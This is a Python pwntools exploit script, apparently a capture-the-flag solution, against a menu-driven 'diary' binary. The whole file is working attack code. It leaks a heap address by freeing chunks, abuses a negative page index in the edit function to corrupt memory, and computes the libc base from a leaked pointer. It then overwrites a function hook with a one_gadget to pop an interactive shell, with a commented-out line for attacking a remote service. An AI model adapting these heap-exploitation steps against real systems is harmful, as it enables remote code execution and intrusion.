from pwn import *

elf = ELF( './diary' )
libc = ELF( './libc.so.6' )

def show_name():
	p.recv(  )
	p.send( str( 1 ) )

def write( len, content ):
	p.recv(  )
	p.send( str( 2 ) )
	p.recv( timeout = 1 )
	p.send( str( len ) )
	p.recv( timeout = 1 )
	p.send( content )

def read( page ):
	p.recv(  )
	p.send( str( 3 ) )
	p.recv( timeout = 1 )
	p.send( str( page ) )

def edit( page, content ):
	p.recv(  )
	p.send( str( 4 ) )
	p.recv( timeout = 1 )
	p.send( str( page ) )
	p.recv( timeout = 1 )
	p.send( content )

def tear( page ):
	p.recv(  )
	p.send( str( 5 ) )
	p.recv( timeout = 1 )
	p.send( str( page ) )

def goodbye():
	p.recv( timeout = 1 )
	p.send( str( 6 ) )


p = elf.process( )

#p = remote( '0.0.0.0', 10101 )
p.recv(  )
p.send( b'A' * 32 )

raw_input()

for i in range( 8 ):
	write( 0x80, chr( i + 0x42 ) * 0x80 )

for i in range( 7, -1, -1 ):
	tear( i )

show_name()
heap_leak = u64( p.recvline()[32:-1].ljust( 8, b'\x00' ) )
print( hex( heap_leak ) )

#raw_input()

payload = b''
payload += p32(heap_leak >> 32)
payload += b'A' * 0x10
payload += p64(heap_leak)
payload += b'A' * 8
payload += p64(heap_leak)
payload += b'A' * 0x28
payload += p64(heap_leak + 4)
payload += p64(0) * 28
raw_input()
edit(-11, payload)

read( 0 )
leak = u64(p.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))
libc_base = leak - 0x3ebca0
one_gadget = libc_base + 0x4f3c2

print( hex(leak) )
print( hex(libc_base) )

payload = b''
payload += p32(leak >> 32)
payload += b'A' * 0x10
payload += p64(leak)
payload += b'A' * 8
payload += p64(leak)
payload += b'A' * 0x28
payload += p64(libc_base + 0x3ecd98)
payload += p64(0) * 28
edit(-11, payload)
raw_input()
edit(0, b'A' * 4 + p64(0) * 361 + p64(one_gadget))
raw_input()
tear(0)

p.interactive()

